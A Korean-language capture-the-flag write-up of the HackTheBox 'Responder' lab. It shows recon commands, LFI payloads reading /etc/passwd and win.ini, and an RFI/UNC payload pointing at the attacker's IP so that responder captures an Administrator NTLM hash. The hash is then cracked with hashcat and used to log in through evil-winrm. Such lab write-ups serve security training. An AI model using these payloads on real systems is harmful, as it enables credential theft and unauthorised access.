# Responder - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 80,5985 -sC -sV -vv -oA Responder 10.129.95.234
```
<img width="973" height="293" alt="image" src="https://github.com/user-attachments/assets/e6cf243a-cb20-42d2-8e0b-11a73f2d31f9" />

- HTTP(80)
- WINRM(5985)
---
## HTTP
### banner grabbing
```bash
whatweb http://unika.htb

curl -IL http://unika.htb
```
<img width="1106" height="272" alt="image" src="https://github.com/user-attachments/assets/b60c92d1-b58c-48db-974b-a3c32c1532e9" />
<br>
<br>

- `http://10.129.95.234`로 접속을 하니 `unika.htb`로 도메인이 설정된 것을 확인하여 `/etc/hosts`에 등록.
<img width="601" height="155" alt="image" src="https://github.com/user-attachments/assets/aef82493-e749-4c84-9a5c-fcb0eeaad30a" />
<br>
<br>

- `gobuster`에서 특별한 directory를 찾을 수 없었음.
```bash
gobuster dir -u http://unika.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,md
```
---
## LFI
- 언어 설정에서 다른 언어로 설정하는 url이 `page`파라미터로 연결되어 있는 점을 확인.
<img width="800" height="401" alt="image" src="https://github.com/user-attachments/assets/97049c80-565e-4ea6-ad4a-0de312fdffef" />
<img width="269" height="42" alt="image" src="https://github.com/user-attachments/assets/08640e36-0b82-4cc2-8411-a00c4740ecf4" />

<br>
<br>

- 파라미터의 값을 변경해서 내부 파일을 읽을 수 있는지 테스트.
```
http://unika.htb/index.php?page=../../../../../etc/passwd
```
<br>
<br>

- 해당 서버가 windows라는 것을 확인할 수 있었음.
<img width="1192" height="145" alt="image" src="https://github.com/user-attachments/assets/17a8edbe-40ba-4231-84db-8b447a296195" />
<br>
<br>

- payload를 바꿔서 시도해보았고, 읽을 수 있는 것을 확인.
- 그러나, 이후 어떤 파일을 읽어야 할지 확인 불가.
```
http://unika.htb/index.php?page=../../../../../windows/win.ini
```
<img width="636" height="90" alt="image" src="https://github.com/user-attachments/assets/eee0f379-a1ba-4689-89fa-b308eeab8678" />

---
## RFI
- local에서 열어놓은 HTTP서버로 연결이 가능한지 시도해보았으나 실패.
```
http://unika.htb/index.php?page=http://10.10.14.240
```
### responder
- 해당 서버가 windows를 사용하고 있기에 `responder`를 사용하여  NTLM 인증 정보 수집 시도
```bash
sudo responder -I tun0 -v
```
<img width="1108" height="448" alt="image" src="https://github.com/user-attachments/assets/4d7a947c-26ee-4063-a150-b0e90d3c08c2" />

<br>
<br>

- local 서버로 연결 시도
- `Administrator` hash 획득
```
http://unika.htb/index.php?page=\\10.10.14.240\test
```
<img width="1108" height="220" alt="image" src="https://github.com/user-attachments/assets/ffec9e0f-a705-4c1b-aea7-db6031d4a1a6" />

---
## cracking hash
```bash
hashcat hash ~/util/rockyou.txt
```
<img width="1108" height="332" alt="image" src="https://github.com/user-attachments/assets/d7c4da53-f198-45f4-a9ad-0cd5c2ca2802" />

---
## evil-winrm
- 획득한 비밀번호로 winrm 접속을 시도.
```bash
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```
<img width="1108" height="282" alt="image" src="https://github.com/user-attachments/assets/cf3216dc-4ad1-4d01-b756-93a69677f474" />

## flag
- `C:\users\mike\desktop`에서 flag 파일 발견
<img width="1106" height="196" alt="image" src="https://github.com/user-attachments/assets/eab77493-1697-4323-9fc5-5cf131d47147" />


